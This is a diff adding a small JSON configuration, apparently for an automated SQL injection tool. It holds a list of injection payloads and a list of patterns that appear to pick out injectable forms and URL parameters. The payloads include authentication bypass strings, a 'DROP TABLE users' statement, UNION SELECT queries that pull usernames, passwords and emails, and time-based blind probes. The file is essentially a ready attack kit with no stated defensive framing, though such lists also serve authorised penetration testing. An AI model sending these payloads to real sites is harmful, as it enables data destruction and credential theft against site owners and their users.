@@ -1,0 +1,26 @@
+{
+  "payloads": [
+    "' OR '1'='1",
+    "' OR '1'='2",
+    "'; DROP TABLE users;--",
+    "' AND 1=1--",
+    "' AND 1=2--",
+    "' UNION SELECT NULL,username,password,email FROM users--",
+    "' UNION ALL SELECT username,password,email,NULL FROM users--",
+    "' OR SLEEP(5)--",
+    "' OR BENCHMARK(10000000,SHA1('test'))--",
+    "'; WAITFOR DELAY '0:0:5'--"
+  ],
+  "aiPatterns": [
+    "<input[^>]*name=\"search\"",
+    "<form[^>]*action",
+    "?id=",
+    "?page=",
+    "?user=",
+    "?username=",
+    "?email=",
+    "?category=",
+    "?product="
+  ],
+  "version": "2.0.0"
+}
